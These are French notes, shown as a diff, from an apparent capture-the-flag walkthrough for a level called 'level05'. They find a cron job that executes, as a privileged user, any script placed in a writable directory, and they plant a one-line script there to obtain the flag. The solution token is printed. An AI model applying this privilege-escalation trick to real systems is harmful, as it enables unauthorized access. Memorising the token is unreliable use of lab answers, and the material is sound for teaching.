@@ -1,8 +1,38 @@
 find / -user "flag05" 2>/dev/null  #spoiler : non
 
-
 en se connectant directement (virtualbox, ect)
 le message "you have a new mail" s'affiche.
+en général un mail est stocké dans /var/spool/mail
+le mail  "level05" contient :
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+ls -l 
+cat /user/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+ls -l /usr/sbin
+-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
+
+on a donc quelque chose qui va bash le contenue de /opt/openarenaserver
+en tant que flag05
+posons donc un petit script qui va permettre de récupér le getflag
+echo "getflag > /tmp/theflag05.txt" > /opt/openarenaserver/script.bash
+
+su -c "sh /usr/sbin/openarenaserver" - flag05
+ne donne ren mais le scripta disparu.
+
+vim /tmp/theflag05.txt
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+
+ajout:
+Au final, ça utilise cron, un daemon qui execute un script à une heure donnée.
+
 
 
 gdb (executif)
